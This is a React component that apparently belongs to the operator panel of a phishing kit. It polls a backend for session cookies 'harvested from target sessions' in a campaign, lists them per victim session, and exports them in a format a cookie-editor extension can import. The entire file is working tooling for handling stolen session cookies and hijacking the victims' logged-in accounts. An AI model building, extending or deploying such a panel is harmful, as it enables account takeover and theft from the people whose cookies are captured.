// src/components/CookiesListener.jsx
import React, { useState, useEffect } from 'react';
import { ClipboardCopy, RefreshCw, Check } from 'lucide-react';
import { downloadCookies, getCapturedCookies } from '../services/apiService';

const CookiesListener = ({ campaignId }) => {
  const [cookies, setCookies] = useState([]);
  const [cookiesBySession, setCookiesBySession] = useState({});
  const [loading, setLoading] = useState(false);
  const [lastUpdated, setLastUpdated] = useState(null);
  const [autoRefresh, setAutoRefresh] = useState(true);
  const [copiedStates, setCopiedStates] = useState({});

  // Fetch cookies from database
  const fetchCookies = async () => {
    if (!campaignId) return;
    
    try {
      setLoading(true);
      const response = await getCapturedCookies(campaignId);
      
      if (response.data) {
        setCookies(response.data.allCookies || []);
        setCookiesBySession(response.data.cookiesBySession || {});
        setLastUpdated(new Date());
      }
    } catch (error) {
      console.error('Error fetching cookies:', error);
    } finally {
      setLoading(false);
    }
  };

  // Initial fetch and polling setup
  useEffect(() => {
    if (!campaignId) return;
    
    // Initial fetch
    fetchCookies();
    
    // Set up polling if auto-refresh is enabled
    let interval;
    if (autoRefresh) {
      interval = setInterval(fetchCookies, 5000); // Poll every 5 seconds
    }
    
    return () => {
      if (interval) clearInterval(interval);
    };
  }, [campaignId, autoRefresh]);

  const showCopySuccess = (key) => {
    setCopiedStates(prev => ({ ...prev, [key]: true }));
    setTimeout(() => {
      setCopiedStates(prev => ({ ...prev, [key]: false }));
    }, 2000);
  };

  const handleCopy = async (sessionToken) => {
    const sessionCookies = cookiesBySession[sessionToken] || [];
    const cookiesText = JSON.stringify(sessionCookies, null, 2);
    
    try {
      // Check if clipboard API is available and supported
      if (navigator.clipboard && typeof navigator.clipboard.writeText === 'function' && window.isSecureContext) {
        await navigator.clipboard.writeText(cookiesText);
        showCopySuccess(`session-${sessionToken}`);
      } else {
        // Fallback for browsers without clipboard API
        const textArea = document.createElement('textarea');
        textArea.value = cookiesText;
        textArea.style.position = 'fixed';
        textArea.style.left = '-999999px';
        textArea.style.top = '-999999px';
        document.body.appendChild(textArea);
        textArea.focus();
        textArea.select();
        try {
          const successful = document.execCommand('copy');
          if (successful) {
            showCopySuccess(`session-${sessionToken}`);
          } else {
            alert('Failed to copy to clipboard. Please copy manually.');
          }
        } catch (err) {
          console.error('Failed to copy to clipboard:', err);
          alert('Failed to copy to clipboard. Please copy manually.');
        }
        document.body.removeChild(textArea);
      }
    } catch (err) {
      console.error('Failed to copy to clipboard:', err);
      alert('Failed to copy to clipboard. Please try again.');
    }
  };

  const handleCopyAll = async () => {
    const cookiesText = JSON.stringify(cookies, null, 2);
    
    try {
      // Check if clipboard API is available and supported
      if (navigator.clipboard && typeof navigator.clipboard.writeText === 'function' && window.isSecureContext) {
        await navigator.clipboard.writeText(cookiesText);
        showCopySuccess('export-all');
      } else {
        // Fallback for browsers without clipboard API
        const textArea = document.createElement('textarea');
        textArea.value = cookiesText;
        textArea.style.position = 'fixed';
        textArea.style.left = '-999999px';
        textArea.style.top = '-999999px';
        document.body.appendChild(textArea);
        textArea.focus();
        textArea.select();
        try {
          const successful = document.execCommand('copy');
          if (successful) {
            showCopySuccess('export-all');
          } else {
            alert('Failed to copy to clipboard. Please copy manually.');
          }
        } catch (err) {
          console.error('Failed to copy to clipboard:', err);
          alert('Failed to copy to clipboard. Please copy manually.');
        }
        document.body.removeChild(textArea);
      }
    } catch (err) {
      console.error('Failed to copy to clipboard:', err);
      alert('Failed to copy to clipboard. Please try again.');
    }
  };

  const handleManualRefresh = () => {
    fetchCookies();
  };

  const handleCopyRawJSON = async (sessionToken) => {
    const sessionCookies = cookiesBySession[sessionToken] || [];
    const formattedCookies = sessionCookies.map(formatCookieForDisplay);
    const rawJSONText = JSON.stringify(formattedCookies, null, 2);
    
    try {
      // Check if clipboard API is available and supported
      if (navigator.clipboard && typeof navigator.clipboard.writeText === 'function' && window.isSecureContext) {
        await navigator.clipboard.writeText(rawJSONText);
        showCopySuccess(`raw-json-${sessionToken}`);
      } else {
        // Fallback for browsers without clipboard API
        const textArea = document.createElement('textarea');
        textArea.value = rawJSONText;
        textArea.style.position = 'fixed';
        textArea.style.left = '-999999px';
        textArea.style.top = '-999999px';
        document.body.appendChild(textArea);
        textArea.focus();
        textArea.select();
        try {
          const successful = document.execCommand('copy');
          if (successful) {
            showCopySuccess(`raw-json-${sessionToken}`);
          } else {
            alert('Failed to copy to clipboard. Please copy manually.');
          }
        } catch (err) {
          console.error('Failed to copy to clipboard:', err);
          alert('Failed to copy to clipboard. Please copy manually.');
        }
        document.body.removeChild(textArea);
      }
    } catch (err) {
      console.error('Failed to copy to clipboard:', err);
      alert('Failed to copy to clipboard. Please try again.');
    }
  };

  const formatCookieForDisplay = (cookie) => {
    // Format cookies in Cookie Editor compatible format
    return {
      name: cookie.name || '',
      value: cookie.value || '',
      domain: cookie.domain || '',
      hostOnly: Boolean(cookie.hostOnly),
      path: cookie.path || '/',
      secure: Boolean(cookie.secure),
      httpOnly: Boolean(cookie.httpOnly),
      sameSite: cookie.sameSite || 'unspecified',
      session: Boolean(cookie.session),
      firstPartyDomain: '',
      partitionKey: null,
      ...(cookie.expirationDate && !cookie.session ? { expirationDate: cookie.expirationDate } : {}),
      storeId: null
    };
  };

  if (!campaignId) {
    return (
      <div className="glass-card p-6">
        <h2 className="text-xl font-semibold text-cyber-primary mb-3">Real-Time Cookie Capture</h2>
        <p className="text-cyber-muted">No campaign selected</p>
      </div>
    );
  }

  if (cookies.length === 0 && !loading) {
    return (
      <div className="glass-card p-6">
        <div className="flex justify-between items-center mb-4">
          <h2 className="text-xl font-semibold text-cyber-primary">Real-Time Cookie Capture</h2>
          <div className="flex items-center space-x-3">
            <label className="flex items-center text-sm text-cyber-muted">
              <div className={`toggle-switch mr-2 ${autoRefresh ? 'active' : ''}`} onClick={(e) => setAutoRefresh(!autoRefresh)}>
                <div className="toggle-slider"></div>
              </div>
              Auto-refresh
            </label>
            <button
              onClick={handleManualRefresh}
              disabled={loading}
              className="glass-button p-2 rounded-lg"
              title="Refresh cookies"
            >
              <RefreshCw size={16} className={loading ? 'animate-spin' : ''} />
            </button>
          </div>
        </div>
        <p className="text-cyber-muted">
          {loading ? 'Scanning for cookies...' : 'No cookies captured yet. Cookies will appear here as they are harvested from target sessions.'}
        </p>
      </div>
    );
  }

  return (
    <div className="space-y-6">
      {/* Header with controls */}
      <div className="glass-card p-6">
        <div className="flex justify-between items-center mb-4">
          <div>
            <h2 className="text-xl font-semibold text-cyber-primary">
              Real-Time Cookie Capture
            </h2>
            <p className="text-sm text-cyber-muted mt-1">
              {cookies.length} cookies harvested from {Object.keys(cookiesBySession).length} sessions
            </p>
          </div>
          <div className="flex items-center space-x-3">
            <label className="flex items-center text-sm text-cyber-muted">
              <div className={`toggle-switch mr-2 ${autoRefresh ? 'active' : ''}`} onClick={(e) => setAutoRefresh(!autoRefresh)}>
                <div className="toggle-slider"></div>
              </div>
              Auto-refresh
            </label>
            <button
              onClick={handleManualRefresh}
              disabled={loading}
              className="glass-button p-2 rounded-lg"
              title="Refresh cookies"
            >
              <RefreshCw size={16} className={loading ? 'animate-spin' : ''} />
            </button>
            <button
              onClick={handleCopyAll}
              className="glass-button px-4 py-2 rounded-lg text-sm"
              title="Copy all cookies"
            >
              {copiedStates['export-all'] ? (
                <>
                  <Check size={16} className="inline mr-2 text-green-500" />
                  Copied!
                </>
              ) : (
                'Export All'
              )}
            </button>
          </div>
        </div>
        
        {lastUpdated && (
          <div className="flex items-center space-x-2 text-xs text-cyber-muted">
            <div className="w-2 h-2 bg-green-400 rounded-full status-indicator"></div>
            <span>Last updated: {lastUpdated.toLocaleTimeString()}</span>
          </div>
        )}
      </div>

      {/* Cookies grouped by session */}
      {Object.entries(cookiesBySession).map(([sessionToken, sessionCookies]) => (
        <div key={sessionToken} className="glass-card p-6">
          <div className="flex justify-between items-center mb-4">
            <div>
              <div className="flex items-center space-x-2">
                <span className="font-mono text-cyber-primary">Session: {sessionToken.substring(0, 12)}...</span>
                <div className="badge badge-success">{sessionCookies.length} cookies</div>
              </div>
              <div className="text-xs text-cyber-muted mt-1">
                Active credential harvesting session
              </div>
            </div>
            <div className="flex space-x-2">
              <button
                onClick={() => handleCopy(sessionToken)}
                className="glass-button p-2 rounded-lg"
                title="Copy session cookies"
              >
                {copiedStates[`session-${sessionToken}`] ? (
                  <Check size={16} className="text-green-500" />
                ) : (
                  <ClipboardCopy size={16} />
                )}
              </button>
            </div>
          </div>

          {/* Cookie list for this session */}
          <div className="space-y-3 max-h-80 overflow-y-auto">
            {sessionCookies.map((cookie, index) => (
              <div key={`${cookie.name}-${index}`} className="data-table rounded-lg p-4">
                <div className="flex justify-between items-start">
                  <div className="flex-1">
                    <div className="font-mono text-sm mb-2">
                      <span className="font-semibold text-cyber-primary">{cookie.name}</span>
                      <span className="text-cyber-muted"> = </span>
                      <span className="text-cyber-secondary">
                        {cookie.value.length > 50 
                          ? `${cookie.value.substring(0, 50)}...` 
                          : cookie.value}
                      </span>
                    </div>
                    <div className="flex flex-wrap gap-2 text-xs mb-2">
                      <span className="badge badge-warning">Domain: {cookie.domain}</span>
                      <span className="badge badge-warning">Path: {cookie.path}</span>
                      {cookie.secure && <span className="badge badge-success">Secure</span>}
                      {cookie.httpOnly && <span className="badge badge-danger">HttpOnly</span>}
                      {cookie.session && <span className="badge badge-success">Session</span>}
                    </div>
                    <div className="text-xs text-cyber-muted">
                      Captured: {new Date(cookie.lastUpdated).toLocaleString()}
                    </div>
                  </div>
                </div>
              </div>
            ))}
          </div>

          {/* Raw JSON view toggle */}
          <details className="mt-4">
            <summary className="cursor-pointer text-sm text-cyber-secondary hover:text-cyber-primary transition-colors">
              View Raw JSON Data
            </summary>
            <div className="data-table rounded-lg mt-3 p-4 max-h-60 overflow-auto">
              <pre className="text-xs text-cyber-muted font-mono">
                {JSON.stringify(sessionCookies.map(formatCookieForDisplay), null, 2)}
              </pre>
              <div className="flex justify-end mt-2">
                <button
                  onClick={() => handleCopyRawJSON(sessionToken)}
                  className="glass-button px-3 py-1 rounded-lg text-sm"
                  title="Copy raw JSON data"
                >
                  {copiedStates[`raw-json-${sessionToken}`] ? (
                    <>
                      <Check size={16} className="inline mr-2 text-green-500" />
                      Copied!
                    </>
                  ) : (
                    'Copy JSON'
                  )}
                </button>
              </div>
            </div>
          </details>
        </div>
      ))}
    </div>
  );
};

export default CookiesListener;
